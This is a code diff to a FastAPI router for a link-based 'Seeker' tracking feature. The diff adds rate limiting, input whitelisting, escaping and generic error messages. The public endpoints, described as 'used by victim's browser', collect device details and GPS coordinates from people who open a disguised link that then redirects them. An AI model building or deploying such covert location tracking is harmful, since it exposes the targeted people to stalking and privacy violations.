@@ -2,7 +2,10 @@
 
 from __future__ import annotations
 
+import json
 import logging
+import time
+from collections import defaultdict
 from pathlib import Path
 from typing import Any
 
@@ -19,6 +22,19 @@ from app.services.seeker_service import SeekerService, get_client_ip
 
 router = APIRouter()
 logger = logging.getLogger(__name__)
+
+# Per-IP rate limit for public seeker endpoints (info/result)
+_seeker_rate_limit_store: dict[str, list[float]] = defaultdict(list)
+
+# Whitelisted form keys and max value length for public seeker endpoints
+_SEEKER_INFO_KEYS = frozenset(
+    {"Ptf", "Brw", "Cc", "Ram", "Ven", "Ren", "Wd", "Ht", "Os"}
+)
+_SEEKER_RESULT_KEYS = frozenset(
+    {"Status", "Lat", "Lon", "Acc", "Alt", "Dir", "Spd", "Error"}
+)
+_MAX_FORM_FIELDS = 20
+_MAX_FIELD_VALUE_LEN = 500
 
 
 def _build_share_url(link: Any, base_url: str) -> tuple[str, str | None, str | None]:
@@ -53,6 +69,36 @@ def _get_templates_dir() -> Path:
     return Path(__file__).parent.parent.parent / "static" / "seeker" / "templates"
 
 
+def _check_seeker_rate_limit(client_ip: str) -> bool:
+    """Return True if under limit, False if rate limited."""
+    limit = settings.SEEKER_PUBLIC_RATE_LIMIT_PER_MINUTE
+    now = time.time()
+    key = f"seeker:{client_ip}"
+    _seeker_rate_limit_store[key] = [
+        ts for ts in _seeker_rate_limit_store[key] if now - ts < 60
+    ]
+    if len(_seeker_rate_limit_store[key]) >= limit:
+        return False
+    _seeker_rate_limit_store[key].append(now)
+    return True
+
+
+def _sanitize_seeker_form(
+    form_data: dict[str, Any],
+    allowed_keys: frozenset[str],
+) -> dict[str, str] | None:
+    """Whitelist keys, cap field count, truncate values. Returns None if invalid."""
+    if len(form_data) > _MAX_FORM_FIELDS:
+        return None
+    out: dict[str, str] = {}
+    for k, v in form_data.items():
+        if k not in allowed_keys:
+            continue
+        s = v if isinstance(v, str) else str(v)
+        out[k] = s[:_MAX_FIELD_VALUE_LEN] if len(s) > _MAX_FIELD_VALUE_LEN else s
+    return out
+
+
 async def _serve_seeker_page(link_id: str, template: str) -> HTMLResponse:
     """Serve Seeker tracking page with injected API base and redirect URL."""
     _ensure_seeker_enabled()
@@ -70,6 +116,9 @@ async def _serve_seeker_page(link_id: str, template: str) -> HTMLResponse:
 
     api_base = f"/api/seeker/{link_id}"
     redirect_url = link.redirectUrl or "https://www.google.com"
+    # JSON-encode to safely embed in JS; escapes ", \, and control chars
+    api_base_safe = json.dumps(api_base)
+    redirect_url_safe = json.dumps(redirect_url)
 
     templates_dir = _get_templates_dir()
     template_path = templates_dir / f"{template}.html"
@@ -79,8 +128,8 @@ async def _serve_seeker_page(link_id: str, template: str) -> HTMLResponse:
         )
 
     content = template_path.read_text(encoding="utf-8")
-    content = content.replace("{{ api_base }}", api_base)
-    content = content.replace("{{ redirect_url }}", redirect_url)
+    content = content.replace("{{ api_base }}", api_base_safe)
+    content = content.replace("{{ redirect_url }}", redirect_url_safe)
 
     return HTMLResponse(content=content)
 
@@ -131,7 +180,7 @@ async def create_seeker_link(
             extra={"exception": type(e).__name__, "user_id": current_user.user_id},
             exc_info=True,
         )
-        raise HTTPException(status_code=500, detail=str(e)) from e
+        raise HTTPException(status_code=500, detail="An internal error occurred") from e
 
 
 @router.get("/links", response_model=SuccessResponse[dict[str, Any]])
@@ -178,7 +227,7 @@ async def list_seeker_links(
             extra={"exception": type(e).__name__, "user_id": current_user.user_id},
             exc_info=True,
         )
-        raise HTTPException(status_code=500, detail=str(e)) from e
+        raise HTTPException(status_code=500, detail="An internal error occurred") from e
 
 
 @router.get("/links/{link_id}", response_model=SuccessResponse[dict[str, Any]])
@@ -282,7 +331,7 @@ async def delete_seeker_link(
             extra={"link_id": link_id, "exception": type(e).__name__},
             exc_info=True,
         )
-        raise HTTPException(status_code=500, detail=str(e)) from e
+        raise HTTPException(status_code=500, detail="An internal error occurred") from e
 
 
 # ----- Public endpoints (no auth) - used by victim's browser -----
@@ -296,10 +345,18 @@ async def seeker_info(
 ):
     """Receive device info from Seeker JS (public)."""
     _ensure_seeker_enabled()
+    client_ip = get_client_ip(request)
+    if not _check_seeker_rate_limit(client_ip):
+        raise HTTPException(
+            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
+            detail="Too many requests",
+        )
     try:
         form = await request.form()
-        form_data = {k: (v if isinstance(v, str) else str(v)) for k, v in form.items()}
-        client_ip = get_client_ip(request)
+        raw = {k: (v if isinstance(v, str) else str(v)) for k, v in form.items()}
+        form_data = _sanitize_seeker_form(raw, _SEEKER_INFO_KEYS)
+        if form_data is None:
+            return ""
         service = SeekerService(db)
         await service.store_device_info(link_id, client_ip, form_data)
         return ""
@@ -321,10 +378,18 @@ async def seeker_result(
 ):
     """Receive location result/error from Seeker JS (public)."""
     _ensure_seeker_enabled()
+    client_ip = get_client_ip(request)
+    if not _check_seeker_rate_limit(client_ip):
+        raise HTTPException(
+            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
+            detail="Too many requests",
+        )
     try:
         form = await request.form()
-        form_data = {k: (v if isinstance(v, str) else str(v)) for k, v in form.items()}
-        client_ip = get_client_ip(request)
+        raw = {k: (v if isinstance(v, str) else str(v)) for k, v in form.items()}
+        form_data = _sanitize_seeker_form(raw, _SEEKER_RESULT_KEYS)
+        if form_data is None:
+            return ""
         service = SeekerService(db)
         await service.store_location_result(link_id, client_ip, form_data)
         return ""
